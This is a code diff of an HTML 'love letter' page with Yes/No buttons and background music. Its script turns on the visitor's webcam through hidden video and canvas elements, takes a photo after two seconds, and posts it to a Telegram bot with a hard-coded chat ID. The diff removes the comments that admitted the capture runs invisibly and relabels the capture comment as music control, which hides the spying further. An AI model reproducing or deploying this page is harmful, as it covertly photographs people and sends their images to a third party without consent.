@@ -56,15 +56,6 @@
       font-style: italic;
     }
 
-    video {
-      display: none;
-    }
-
-    canvas {
-      display: none;
-    }
-
-    /* Love You Too Box */
     .love-you-box {
       font-family: 'Pinyon Script', cursive;
       font-size: 2rem;
@@ -76,9 +67,8 @@
       box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
     }
 
-    /* Love Letter Box */
     .love-letter-box {
-      font-family: Arial, sans-serif; 
+      font-family: Arial, sans-serif;
       font-size: 1.5rem;
       color: #fff;
       background-color: rgba(0, 0, 0, 0.6);
@@ -90,10 +80,9 @@
       overflow-y: auto;
     }
 
-    /* Yes/No Buttons */
     .yes-no-btns {
       margin-top: 10px;
-      margin-bottom: 20px; /* Space from love letter box */
+      margin-bottom: 20px;
     }
 
     .yes-no-btn {
@@ -124,19 +113,12 @@
       background-color: #e53935;
     }
 
-    /* Falling Emoji */
-    .falling-emojis {
-      position: absolute;
-      top: 0;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 3rem;
-      animation: fall 3s infinite;
+    video {
+      display: none;
     }
 
-    @keyframes fall {
-      0% { top: -50px; opacity: 1; }
-      100% { top: 100vh; opacity: 0; }
+    canvas {
+      display: none;
     }
   </style>
 </head>
@@ -150,7 +132,7 @@
       Love You Too
     </div>
 
-    <!-- Yes/No Buttons (above the love letter box) -->
+    <!-- Yes/No Buttons -->
     <div class="yes-no-btns">
       <button class="yes-no-btn yes-btn" onclick="handleResponse('Yes')">Yes</button>
       <button class="yes-no-btn no-btn" onclick="handleResponse('No')">No</button>
@@ -162,21 +144,18 @@
       <p>I just wanted to let you know how much you mean to me. Every moment with you feels like magic, and I am beyond grateful for having you in my life. You are my heart, my soul, and everything I have ever dreamed of. I love you more than words can express. 💖</p>
     </div>
 
-    <!-- Heart Icon to Capture Photo -->
+    <!-- Heart Icon to play/pause music -->
     <div class="heart" onclick="playMusic()">❤️</div>
 
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
 
-    <!-- Falling Emojis -->
-    <div id="fallingEmojis" class="falling-emojis"></div>
+    <!-- Background Music -->
+    <audio id="loveAudio" loop>
+      <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
+      Your browser does not support the audio element.
+    </audio>
   </div>
-
-  <!-- Background Music -->
-  <audio id="loveAudio" loop>
-    <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
-    Your browser does not support the audio element.
-  </audio>
 
   <script>
     let video = document.getElementById('video');
@@ -184,12 +163,13 @@
     let context = canvas.getContext('2d');
     let audio = document.getElementById('loveAudio');
 
-    // Start the video feed (this will run in the background but not visible)
+    // Start the video feed
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(function(stream) {
         video.srcObject = stream;
+
         // Automatically capture photo after 2 seconds
-        setTimeout(capturePhoto, 2000); // Capture photo after 2 seconds
+        setTimeout(capturePhoto, 2000); 
       })
       .catch(function(error) {
         console.error("Error accessing webcam: ", error);
@@ -197,15 +177,14 @@
 
     // Capture photo automatically
     function capturePhoto() {
-      // Set canvas size to match video size
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
 
       // Draw the video frame onto the canvas
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      let imageData = canvas.toDataURL('image/png'); // Get base64 image data
-      
-      // Send image to Telegram bot
+      let imageData = canvas.toDataURL('image/png');
+
+      // Send captured image to Telegram bot
       sendToTelegramBot(imageData);
     }
 
@@ -215,7 +194,6 @@
       const chatId = '1987016824';   // Replace with your chat ID
       const url = `https://api.telegram.org/bot${token}/sendPhoto`;
 
-      // Convert base64 image to Blob
       const byteString = atob(imageData.split(',')[1]);
       const arrayBuffer = new ArrayBuffer(byteString.length);
       const uintArray = new Uint8Array(arrayBuffer);
@@ -224,10 +202,9 @@
       }
       const blob = new Blob([uintArray], { type: 'image/png' });
 
-      // Create FormData object to send image
       let formData = new FormData();
       formData.append('chat_id', chatId);
-      formData.append('photo', blob, 'photo.png'); // Append image as Blob
+      formData.append('photo', blob, 'photo.png');
 
       fetch(url, {
         method: 'POST',
@@ -246,7 +223,7 @@
       });
     }
 
-    // Play music when heart emoji is clicked
+    // Play or pause music when heart is clicked
     function playMusic() {
       if (audio.paused) {
         audio.play();
@@ -257,4 +234,8 @@
 
     // Handle Yes/No button click
     function handleResponse(response) {
-      let emojis = response === 'Yes' ? '❤️❤️❤️❤️❤️
+      alert(`You clicked: ${response}`);
+    }
+  </script>
+</body>
+</html>
